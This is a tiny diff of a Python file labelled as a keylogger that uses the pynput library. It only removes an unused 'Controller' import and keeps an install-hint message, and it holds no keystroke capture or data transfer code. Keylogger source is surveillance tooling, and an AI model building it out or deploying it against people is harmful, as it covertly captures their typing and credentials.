@@ -1,7 +1,7 @@
 #Keylogger by Urmil Shroff
 
 try:
-    from pynput.keyboard import Controller, Key, Listener
+    from pynput.keyboard import Key, Listener
     import logging
 except:
     print("Please make sure Pynput is correctly installed on your system from https://github.com/moses-palmer/pynput")
